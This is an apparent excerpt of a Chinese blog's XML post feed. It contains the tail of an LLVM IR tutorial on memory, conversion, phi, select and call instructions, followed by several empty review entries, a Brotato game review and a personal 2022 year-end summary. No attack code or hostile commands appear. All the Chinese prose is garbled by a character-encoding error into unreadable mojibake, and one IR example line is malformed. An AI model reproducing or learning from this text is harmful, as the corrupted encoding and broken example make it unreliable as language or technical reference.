class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>;i ++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello, %d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸€ç§å®ç°æ–¹å¼ï¼Œä¹Ÿæ˜¯ LLVM IR é‡‡å–çš„å®ç°æ–¹å¼ã€‚åœ¨LLVM IR ä¸­ä¹Ÿæœ‰ç±»ä¼¼ malloc å’Œ æŒ‡é’ˆæ“ä½œ çš„æŒ‡ä»¤</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *i = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span>(*i = <span class="number">0</span>; *i &lt; <span class="number">100</span>; (*i) ++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello, %d\n&quot;</span>, *i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="alloca-æŒ‡ä»¤"><a href="#alloca-æŒ‡ä»¤" class="headerlink" title="alloca æŒ‡ä»¤"></a>alloca æŒ‡ä»¤</h3><ul><li>å†…å­˜åˆ†é…æŒ‡ä»¤ï¼Œåœ¨<strong>æ ˆ</strong>ä¸­åˆ†é…ä¸€å—ç©ºé—´å¹¶è·å¾—æŒ‡å‘è¯¥ç©ºé—´çš„æŒ‡é’ˆï¼Œç±»ä¼¼äº C&#x2F;C++ ä¸­çš„ malloc å‡½æ•°</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = alloca &lt;type&gt; [, &lt;type&gt; &lt;NumElements&gt;] [, align &lt;alignment&gt;]; åˆ†é…sizeof(type)*NumElements å­—èŠ‚çš„å†…å­˜ï¼Œåˆ†é…åœ°å€ä¸ alignment å¯¹é½</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">%ptr = alloca i32; åˆ†é… 4 å­—èŠ‚çš„å†…å­˜å¹¶è¿”å› i32 ç±»å‹çš„æŒ‡é’ˆ</span><br><span class="line">%ptr = alloca i32, i32 4; åˆ†é… 4*4 å­—èŠ‚çš„å†…å­˜å¹¶è¿”å› i32 ç±»å‹çš„æŒ‡é’ˆ</span><br><span class="line">%ptr = alloca i32, i32 4, align 1024; åˆ†é… 4*4 å­—èŠ‚çš„å†…å­˜å¹¶è¿”å› i32 ç±»å‹çš„æŒ‡é’ˆï¼Œåˆ†é…çš„åœ°å€ä¸ 1024 å¯¹é½</span><br><span class="line">%ptr = alloca i32, align 1024; åˆ†é… 4 å­—èŠ‚çš„å†…å­˜å¹¶è¿”å› i32 ç±»å‹çš„æŒ‡é’ˆï¼Œåˆ†é…çš„åœ°å€ä¸ 1024 å¯¹é½</span><br></pre></td></tr></table></figure><h3 id="store-æŒ‡ä»¤"><a href="#store-æŒ‡ä»¤" class="headerlink" title="store æŒ‡ä»¤"></a>store æŒ‡ä»¤</h3><ul><li>å†…å­˜å­˜å‚¨æŒ‡ä»¤ï¼Œå‘æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸­å­˜å‚¨æ•°æ®ï¼Œç±»ä¼¼äº C&#x2F;C++ ä¸­çš„æŒ‡é’ˆè§£å¼•ç”¨åçš„èµ‹å€¼æ“ä½œ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">store &lt;type&gt; &lt;value&gt;, &lt;type&gt;* &lt;pointer&gt;; å‘ç‰¹å®šç±»å‹æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å­˜å‚¨ç›¸åŒç±»å‹çš„æ•°æ®</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">%ptr = alloca i32; yields i32*:ptr</span><br><span class="line">store i32 3, i32* %ptr; yields void</span><br></pre></td></tr></table></figure><h3 id="load-æŒ‡ä»¤"><a href="#load-æŒ‡ä»¤" class="headerlink" title="load æŒ‡ä»¤"></a>load æŒ‡ä»¤</h3><ul><li>å†…å­˜è¯»å–æŒ‡ä»¤ï¼Œä»æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸­è¯»å–æ•°æ®ï¼Œç±»ä¼¼äº C&#x2F;C++ ä¸­çš„æŒ‡é’ˆè§£å¼•ç”¨æ“ä½œ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">result = load &lt;type&gt;, &lt;type&gt;* &lt;pointer&gt;; ä»ç‰¹å®šç±»å‹æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸­è¯»å–ç‰¹å®šç±»å‹çš„æ•°æ®</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">%ptr = alloca i32; yields i32*:ptr</span><br><span class="line">store i32 3, i32* %ptr; yields void</span><br><span class="line">%val = load i32, i32* %ptr; yields i32:val = i32 3</span><br></pre></td></tr></table></figure><h2 id="ç±»å‹è½¬æ¢æ“ä½œ-Conversion-Operations"><a href="#ç±»å‹è½¬æ¢æ“ä½œ-Conversion-Operations" class="headerlink" title="ç±»å‹è½¬æ¢æ“ä½œ Conversion Operations"></a>ç±»å‹è½¬æ¢æ“ä½œ Conversion Operations</h2><h3 id="trunc-to-æŒ‡ä»¤"><a href="#trunc-to-æŒ‡ä»¤" class="headerlink" title="trunc .. to æŒ‡ä»¤"></a>trunc .. to æŒ‡ä»¤</h3><ul><li>uæˆªæ–­æŒ‡ä»¤ï¼Œå°†ä¸€ç§ç±»å‹çš„å˜é‡æˆªæ–­ä¸ºå¦ä¸€ç§ç±»å‹çš„å˜é‡ã€‚å¯¹åº” C&#x2F;C++ ä¸­å¤§ç±»å‹å‘å°ç±»å‹çš„å¼ºåˆ¶è½¬æ¢ï¼ˆæ¯”å¦‚ long å¼ºè½¬ intï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = trunc &lt;type1&gt; &lt;value&gt; to &lt;type2&gt;; å°† type1 ç±»å‹çš„å˜é‡æˆªæ–­ä¸º type2 ç±»å‹çš„å˜é‡</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">%X = trunc i32 257 to i8; yields i8:1</span><br><span class="line">%Y = trunc i32 123 to i1; yields i1:true</span><br><span class="line">%Z = trunc i32 122 to i1; yields i1:false</span><br><span class="line">%W = trunc i32 &lt;2 x i16&gt; &lt;i16 8, i16 7&gt; to &lt;2 x i8&gt;; yields &lt;i8 8, i8 7&gt;</span><br></pre></td></tr></table></figure><h3 id="zext-to-æŒ‡ä»¤"><a href="#zext-to-æŒ‡ä»¤" class="headerlink" title="zext .. to æŒ‡ä»¤"></a>zext .. to æŒ‡ä»¤</h3><ul><li>é›¶æ‹“å±•ï¼ˆZero Extendï¼‰æŒ‡ä»¤ï¼Œå°†ä¸€ç§ç±»å‹çš„å˜é‡æ‹“å±•ä¸ºå¦ä¸€ç§ç±»å‹çš„å˜é‡ï¼Œé«˜ä½è¡¥0ã€‚å¯¹åº” C&#x2F;C++ ä¸­å°ç±»å‹å‘å¤§ç±»å‹çš„å¼ºåˆ¶è½¬æ¢ï¼ˆæ¯”å¦‚ int å¼ºè½¬ longï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = zext &lt;type1&gt; &lt;value&gt; to &lt;type2&gt;; å°† type1 ç±»å‹çš„å˜é‡æ‹“å±•ä¸º type2 ç±»å‹çš„å˜é‡</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">%X = zext i32 257 to i64; yields i64:257</span><br><span class="line">%Y = zext i1 true to i32; yields i32:1</span><br><span class="line">%Z = zext &lt;2 x i16&gt; &lt;i16 8, i16 7&gt; to &lt;2 x i32&gt;; yields &lt;i32 8, i32 7&gt;</span><br></pre></td></tr></table></figure><h3 id="sext-to-æŒ‡ä»¤"><a href="#sext-to-æŒ‡ä»¤" class="headerlink" title="sext .. to æŒ‡ä»¤"></a>sext .. to æŒ‡ä»¤</h3><ul><li>ç¬¦å·ä½æ‹“å±•ï¼ˆSign Extendï¼‰æŒ‡ä»¤ï¼Œé€šè¿‡å¤åˆ¶ç¬¦å·ä½ï¼ˆæœ€é«˜ä½ï¼‰å°†ä¸€ç§ç±»å‹çš„å˜é‡æ‹“å±•ä¸ºå¦ä¸€ç§ç±»å‹çš„å˜é‡</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = sext &lt;type1&gt; &lt;value&gt; to &lt;type2&gt;; å°† type1 ç±»å‹çš„å˜é‡æ‹“å±•ä¸º type2 ç±»å‹çš„å˜é‡</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">%X = sext i8 -1 to i16; yields i16:-1</span><br><span class="line">%Y = sext i1 true to i32; yields i32:-1</span><br><span class="line">%Z = sext &lt;2 x i16&gt; &lt;i16 8, i16 7&gt; to &lt;2 x i32&gt;; yields &lt;i32 8, i32 7&gt;</span><br></pre></td></tr></table></figure><h2 id="å…¶ä»–æ“ä½œ-Other-Operations"><a href="#å…¶ä»–æ“ä½œ-Other-Operations" class="headerlink" title="å…¶ä»–æ“ä½œ Other Operations"></a>å…¶ä»–æ“ä½œ Other Operations</h2><h3 id="phi-æŒ‡ä»¤"><a href="#phi-æŒ‡ä»¤" class="headerlink" title="phi æŒ‡ä»¤"></a>phi æŒ‡ä»¤</h3><p>ç”±é™æ€å•èµ‹å€¼å¼•èµ·çš„é—®é¢˜ï¼šåœ¨æœ€åä¸€ä¸ªåŸºæœ¬å—ä¸­ï¼Œæˆ‘ä»¬æ€ä¹ˆçŸ¥é“åº”è¯¥ä½¿ç”¨ y1 å˜é‡è¿˜æ˜¯y2 å˜é‡å‘¢ï¼Ÿ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230207034927020.png" alt="image-20230207034927020"></p><p>ué€šè¿‡å¼•å…¥ Î¦ å‡½æ•°æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒÎ¦ å‡½æ•°çš„å€¼ç”±å‰é©±å—å†³å®šï¼Œè¿™é‡Œçš„ Î¦ å‡½æ•°å¯¹åº” LLVM IR ä¸­çš„ phi æŒ‡ä»¤ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230207041246011.png" alt="image-20230207041246011"></p><ul><li>phi æŒ‡ä»¤å¯ä»¥çœ‹åšæ˜¯ä¸ºäº†è§£å†³ SSA ä¸€ä¸ªå˜é‡åªèƒ½è¢«èµ‹å€¼ä¸€æ¬¡è€Œå¼•èµ·çš„é—®é¢˜è¡ç”Ÿå‡ºçš„æŒ‡ä»¤</li><li>phi æŒ‡ä»¤çš„è®¡ç®—ç»“æœç”± phi æŒ‡ä»¤æ‰€åœ¨çš„åŸºæœ¬å—çš„ <strong>å‰é©±å—</strong> ç¡®å®š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = phi &lt;type&gt; [ &lt;val0&gt;, &lt;label0&gt;], ... ; å¦‚æœå‰é©±å—ä¸º label0ï¼Œåˆ™ result=val0 ...</span><br><span class="line">ä¾‹ï¼šå®ç° for å¾ªç¯</span><br><span class="line">Loop:; Infinite loop that counts from 0 on up...</span><br><span class="line">%indvar = phi i32 [ 0, %LoopHeader ], [ %nextindvar, %Loop ]</span><br><span class="line">%nextindvar = add i32 %indvar, 1</span><br><span class="line">br label %Loop</span><br></pre></td></tr></table></figure><h3 id="select-æŒ‡ä»¤"><a href="#select-æŒ‡ä»¤" class="headerlink" title="select æŒ‡ä»¤"></a>select æŒ‡ä»¤</h3><ul><li>select æŒ‡ä»¤ç±»ä¼¼äº C&#x2F;C++ ä¸­çš„<strong>ä¸‰å…ƒè¿ç®—ç¬¦</strong>â€â€¦ ? â€¦ : â€¦â€</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = select i1 &lt;cond&gt;, &lt;type&gt; &lt;val1&gt;, &lt;type&gt; &lt;val2&gt;;å¦‚æœæ¡ä»¶ cond æˆç«‹ï¼Œresult=val1ï¼Œå¦åˆ™ result=val2</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">%X = select i1 true, i8 17, i8 42 ; yields i8:17</span><br></pre></td></tr></table></figure><h3 id="call-æŒ‡ä»¤"><a href="#call-æŒ‡ä»¤" class="headerlink" title="call æŒ‡ä»¤"></a>call æŒ‡ä»¤</h3><ul><li>call æŒ‡ä»¤ç”¨æ¥è°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„å‡½æ•°è°ƒç”¨ï¼Œä¸x86æ±‡ç¼–ä¸­çš„ call æŒ‡ä»¤ç±»ä¼¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = call &lt;type&gt;|&lt;fntype&gt; &lt;fnptrval&gt;(&lt;function args&gt;) ;è°ƒç”¨å‡½æ•°</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">%retval = call i32 @test(i32 %argc) ; è°ƒç”¨ test å‡½æ•°ï¼Œå‚æ•°ä¸º i32 ç±»å‹ï¼Œè¿”å›å€¼ä¸º i32 ç±»å‹</span><br><span class="line">call i32 (i8*, ...)* @printf(i8* %msg, i32 12, i8 42); è°ƒç”¨ printf å‡½æ•°ï¼Œå‚æ•°å¯å˜</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šå­¤ç‹¬æ‘‡æ»šï¼ã€‹ï¼šå¯çˆ±æ¸©æŸ”å¼•äººå…±é¸£</title>
      <link href="/posts/42707/"/>
      <url>/posts/42707/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠåŒäººæˆè¡Œã€‹æ¸¸æˆæµ‹è¯„</title>
      <link href="/posts/51999/"/>
      <url>/posts/51999/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠLoveChoice æ‹£çˆ±ã€‹æ¸¸æˆæµ‹è¯„</title>
      <link href="/posts/26382/"/>
      <url>/posts/26382/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠBrotatoã€‹æ¸¸æˆæµ‹è¯„</title>
      <link href="/posts/59327/"/>
      <url>/posts/59327/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éå¸¸ä¸Šå¤´çš„ä¸€æ¬¾å°æ¸¸æˆï¼Œ46 å°æ—¶å…¨æˆå°±é€šå…³ï¼Œæ€»ç»“è®°å½•ä¸€ä¸‹</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230106153903860.png" alt="image-20230106153903860"></p><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>çœ‹å®«æœ¬ç‹—é›¨åœ¨ç›´æ’­é—´ç©äº†ï¼Œéå¸¸æœ‰æ„æ€ï¼Œç«‹é©¬ 22 å—ä¹°äº†å¼€å§‹ç©ã€‚æœä¸å…¶ç„¶éå¸¸ä¸Šå¤´ï¼Œååˆ†æ€æ—¶é—´ã€‚</p><h2 id="æ¸¸æˆæ€§"><a href="#æ¸¸æˆæ€§" class="headerlink" title="æ¸¸æˆæ€§"></a>æ¸¸æˆæ€§</h2><p>è½»è‚‰é¸½è±å…‹æ¸¸æˆï¼Œä¸»è§’æ˜¯ä¸ªbåœŸè±†ï¼ˆæˆ‘ä¸€å¼€å§‹æ˜¯çœŸæ²¡çœ‹å‡ºæ¥ï¼‰ï¼Œæ‰“çš„æ˜¯å¤–æ˜Ÿäººã€‚éš¾åº¦æ¯”è¾ƒé€‚ä¸­ï¼Œä¹Ÿæ¯”è¾ƒåƒè¿æ°”ï¼Œç®—å¾—ä¸Šæ˜¯ä¸€ä¸ªä¼‘é—²å°æ¸¸æˆã€‚</p><h3 id="ç©æ³•"><a href="#ç©æ³•" class="headerlink" title="ç©æ³•"></a>ç©æ³•</h3><p>å¯ä»¥é€‰æ‹©ä¸åŒçš„ä¸»è§’ï¼Œæ¯ä¸€ä¸ªä¸»è§’æœ‰ç‰¹å®šçš„æŠ€èƒ½æ•ˆæœï¼Œæ™®éå¯ä»¥æ‹¿ 6 ä¸ªæ­¦å™¨ã€‚</p><p>æ¯ä¸€å±€ä¸€å…± 20 å…³ï¼Œæ¯ä¸€å…³æ€æ€ªä¼šæ‰è½é’±ï¼Œæ¡é’±å¯ä»¥åŠ ç»éªŒå€¼ï¼Œå‡çº§å¯ä»¥åŠ å±æ€§ï¼Œæ²¡æ¡åˆ°çš„é’±ä¼šåœ¨å½“å‰å…³å¡ç»“æŸæ—¶è‡ªåŠ¨æ”¶é›†ï¼Œæ¯è¿‡ä¸€å…³å¯ä»¥è¿›å…¥å•†åº—ä¹°æ­¦å™¨å’Œé“å…·ã€‚</p><p><strong>æ ¸å¿ƒç©æ³•å°±æ˜¯é“å…·ã€æ­¦å™¨å’Œè§’è‰²æŠ€èƒ½ä¹‹é—´çš„é…åˆ</strong>ï¼Œå› ä¸ºå¤§éƒ¨åˆ†é“å…·ä¸æ˜¯å•çº¯çš„å¢ç›Šå±æ€§ï¼Œè€Œæ˜¯å¢åŠ æŸå±æ€§çš„åŒæ—¶å‰Šå¼±å¦ä¸€ä¸ªå±æ€§ï¼Œæ¯”å¦‚<strong>å¢åŠ  6% ä¼¤å®³ï¼Œå‡å°‘ 8 èŒƒå›´</strong>ï¼Œç©å®¶éœ€è¦æœ‰å–èˆçš„è·å–è‡ªå·±éœ€è¦çš„å±æ€§å’Œæ­¦å™¨ã€‚</p><p>éš¾åº¦åˆ†ä¸ºå±é™© 0 - 5ï¼Œå…­ä¸ªéš¾åº¦ï¼Œæ¯è¿‡ä¸€ä¸ªéš¾åº¦ç­‰çº§ä¼šè§£é”ä¸€ä¸ªæ–°è§’è‰²ï¼Œåœ¨å¯¹å±€ä¸­è¾¾åˆ°æŸäº›ç‰¹å®šå±æ€§ï¼Œä¹Ÿä¼šè§£é”æ–°è§’è‰²ã€‚</p><p>æ¯ä¸ªè§’è‰²çš„æŠ€èƒ½éƒ½ä¸åŒï¼Œæ‰€ä»¥éƒ½éå¸¸æœ‰ç‰¹ç‚¹ï¼Œå¯¼è‡´ç©æ³•å’Œæµæ´¾ä¹Ÿåƒå¥‡ç™¾æ€ªï¼Œå†åŠ ä¸Šåˆ·æ–°çš„é“å…·æ­¦å™¨ä¸åŒï¼Œè¿æ°”å¥½åï¼Œä½¿å¾—è¿™ä¸ªæ¸¸æˆå¾ˆéš¾ç©è…»ï¼Œæ¯ä¸€å±€éƒ½å¾ˆæœ‰æ–°é²œæ„Ÿã€‚</p><h3 id="ç¾æœ¯å’ŒéŸ³ä¹"><a href="#ç¾æœ¯å’ŒéŸ³ä¹" class="headerlink" title="ç¾æœ¯å’ŒéŸ³ä¹"></a>ç¾æœ¯å’ŒéŸ³ä¹</h3><p>ç¾æœ¯å°±è¿™æ ·ï¼Œå°æˆæœ¬æ¸¸æˆï¼Œä½†è¿˜æ˜¯æœ‰ç‚¹ç²¾è‡´çš„ã€‚</p><p>éŸ³ä¹æˆ‘ç©ç€ç©ç€æœ‰ç‚¹å¬è…»äº†ï¼Œå°±å…¨éƒ¨å…³æ‰äº†ã€‚</p><h3 id="å‰§æƒ…"><a href="#å‰§æƒ…" class="headerlink" title="å‰§æƒ…"></a>å‰§æƒ…</h3><p>å°±æ˜¯ä¸€åœŸè±†é™è½å¤–æ˜Ÿçƒæ‰“å¤–æ˜Ÿäººçš„æ•…äº‹ï¼Œæ¯«æ— å‰§æƒ…å¯è¨€ï¼Œåˆ·åˆ·åˆ·å°±å®Œäº‹äº†ã€‚</p><h2 id="ç»¼åˆè¯„ä»·"><a href="#ç»¼åˆè¯„ä»·" class="headerlink" title="ç»¼åˆè¯„ä»·"></a>ç»¼åˆè¯„ä»·</h2><p>éå¸¸ä¸Šå¤´çš„ä¸€æ¬¾å°æ¸¸æˆï¼Œéš¾åº¦ä¸å¤§ï¼Œä¹Ÿæ¯”è¾ƒæœ‰è¶£ï¼Œè€ç©æ€§è¾ƒé«˜ï¼Œè¿˜æ¯”è¾ƒè§£å‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸¸æˆæµ‹è¯„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸¸æˆæµ‹è¯„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´ç»ˆæ€»ç»“</title>
      <link href="/posts/57980/"/>
      <url>/posts/57980/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>æ†¨é¸ é¸ åˆä¸€æ—¥ï¼ŒæŸ’æ‡µæ‡µåˆä¸€å¹´ã€‚</p></blockquote><blockquote><p>2023.1.6 ä¸‹åˆå¼€<del>å†™</del>æ‘†</p><p>1.11 æ›´æ–°</p></blockquote><h1 id="æ¥æ—¥"><a href="#æ¥æ—¥" class="headerlink" title="æ¥æ—¥"></a>æ¥æ—¥</h1><ul><li><input checked="" disabled="" type="checkbox"> <strong>å¥½å¥½åƒé¥­ï¼Œå¥½å¥½ä¸Šè¯¾ï¼Œå¥½å¥½ç¡è§‰</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>å…‹æœæ‹–å»¶ç—‡</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>æ‹¿ä¸‹ä¸€å° macOS</strong></li><li><input disabled="" type="checkbox"> <strong>ç©ºé—²æ—¶é—´ç»§ç»­å­¦äºŒè¿›åˆ¶ï¼Œå°è¯•å¤ç°ä¸€äº›ğŸçš„æ¼æ´</strong></li><li><input disabled="" type="checkbox"> <strong>è¿‡å¤§å››ä½“æµ‹</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>è£…ä¿®å¥½è‡ªå·±çš„æˆ¿é—´</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>å…»æˆä¸€äº›è‰¯å¥½çš„ä¹ æƒ¯ï¼Œæ¯”å¦‚æ—©ç¡æ—©èµ·ã€è·‘æ­¥&#x2F;æ•£æ­¥&#x2F;å¿«èµ°</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>èº«ä½“æ¢å¤æ­£å¸¸</strong></li></ul><blockquote><p>ä»Šå¹´å”¯ä¸€å¯æƒœçš„å¯èƒ½å°±æ˜¯æ²¡æœ‰è€ƒç ”ä¸Šå²¸å§ã€‚</p><p>è¿™ä¸€å¹´è¿‡çš„å¾ˆå¹³æ·¡ï¼Œå¤§å››è€ä¸œè¥¿ä»ç¤¾å›¢ä¸­æ…¢æ…¢è„±èº«ï¼Œå˜æˆäº†ä¸€ä¸ªæ™®é€šçš„å¤§å­¦ç”Ÿå·å…¥è€ƒç ”çš„æµªæ½®ã€‚å¾—ç›Šäºè§„å¾‹çš„è€ƒç ”ç”Ÿæ´»ï¼Œä»¥å‰çš„é¬¼è§æ„ä½œæ¯ä¹Ÿè°ƒæ•´è¿‡æ¥äº†ï¼Œä¸€å¹´ä¸‹æ¥ä¹Ÿæ²¡ç”Ÿä»€ä¹ˆç—…ï¼Œæœ€ä¸¥é‡çš„ä¸€åœºå¤§ç—…å°±æ˜¯è€ƒç ”å‰é˜³äº†ï¼ŒçœŸæ˜¯å„ç§æ„ä¹‰ä¸Šçš„ä¸¥é‡ã€‚</p><p>ä¸ŠåŠå¹´æ‹¿äº†ä¸ª 3k çš„ä¼ä¸šå¥–å­¦é‡‘ï¼Œè‡ªå·±å¡«äº†ç‚¹ä¹°äº†ä¸ªäºŒæ‰‹çš„ mac miniï¼Œå¹´æœ«å› ä¸ºå®åœ¨å—ä¸äº†ä¸€åŠ  7p çš„ç¢å±å’Œçƒ§å±ï¼Œæ”¶äº†ä¸ªäºŒæ‰‹çš„ iPhone13 proï¼Œå†åŠ ä¸Šå»å¹´ä¹°çš„åº•é… iPadï¼Œä¹Ÿç®—ç£•ç£•ç»Šç»Šå‡‘é½äº†å…¨å®¶æ¡¶ï¼Œè¢«è¿«æŠ•å…¥äº†è‹¹æœç”Ÿæ€çš„æ€€æŠ±ã€‚æ¯”è¾ƒä¸æ»¡æ„çš„æ˜¯æ²¡èƒ½åšæŒæŒ¤å‡ºæ—¶é—´æ¥å­¦äºŒè¿›åˆ¶ï¼Œmac mini æ²¡æœ‰å®ç°æˆ‘ä¹°å®ƒçš„åˆè¡·ã€‚</p><p>ä»Šå¹´å®¶é‡Œé¢å…¨éƒ¨é‡æ–°è£…ä¿®ï¼Œæˆ‘çš„æˆ¿é—´å…¨éƒ¨å¤§æ”¹ï¼Œæˆ‘ä»åˆä¸­å¼€å§‹ä½æ ¡åˆ°ä»Šå¹´å¤§å››ï¼Œä¸è®ºæ˜¯åœ¨å®¶è¿˜æ˜¯åœ¨å­¦æ ¡ï¼Œæˆ‘éƒ½æ˜¯ç¡çš„2*1.5çš„ä¸Šä¸‹é“ºï¼Œäºæ˜¯åœ¨æˆ‘çš„å¼ºçƒˆæŠ—è®®ä¸‹ï¼Œè€çˆ¸è€å¦ˆä¸¢æ‰äº†æˆ‘æˆ¿é—´é‡Œé¢çš„ä¸Šä¸‹é“ºï¼Œç»™æˆ‘ä¹°äº†ä¸ªå¤§åºŠï¼Œéå¸¸èˆ’æœæˆ‘åªèƒ½è¯´ã€‚</p><p>ä¸ºä»€ä¹ˆå¤§å››ä½“æµ‹æ²¡è¿‡å‘¢ï¼Œå½“ç„¶æ˜¯å› ä¸ºè¿™ä¸ª b ç–«æƒ…ï¼Œå¯¼è‡´æ•´ä¸ªå¤§å››ä¸Šéƒ½æ²¡å®‰æ’åˆ°ä½“æµ‹ã€‚</p></blockquote><h1 id="æ–¹é•¿"><a href="#æ–¹é•¿" class="headerlink" title="æ–¹é•¿"></a>æ–¹é•¿</h1><ul><li><input disabled="" type="checkbox"> <strong>å¥½å¥½åƒé¥­ï¼Œå¥½å¥½å­¦ä¹ ï¼Œå¥½å¥½ç¡è§‰</strong></li><li><input disabled="" type="checkbox"> <strong>è€ƒç ”ä¸Šå²¸</strong></li><li><input disabled="" type="checkbox"> <strong>é¡ºåˆ©æ¯•ä¸š</strong></li><li><input disabled="" type="checkbox"> <strong>é‡æ‹¾å‰ä»–</strong></li><li><input disabled="" type="checkbox"> <strong>å…¥é—¨è°ƒé…’</strong></li><li><input disabled="" type="checkbox"> <strong>æ¯ä¸ªæœˆæ”’å‡ ç™¾å—é’±ï¼Œä¸è¦æœˆå…‰</strong></li></ul><h1 id="å¯’å‡"><a href="#å¯’å‡" class="headerlink" title="å¯’å‡"></a>å¯’å‡</h1><p>å› ä¸ºç–«æƒ…æ²¡ä»€ä¹ˆå¹´å‘³ï¼Œä¹Ÿæ²¡å»å“ªé‡Œæ‹œå¹´ã€‚æ¯”è¾ƒæœ‰æ„æ€çš„äº‹æ˜¯è·Ÿé«˜ä¸­çš„è€åŒå­¦ä»¬å‡ºæ¥èšäº†å‡ 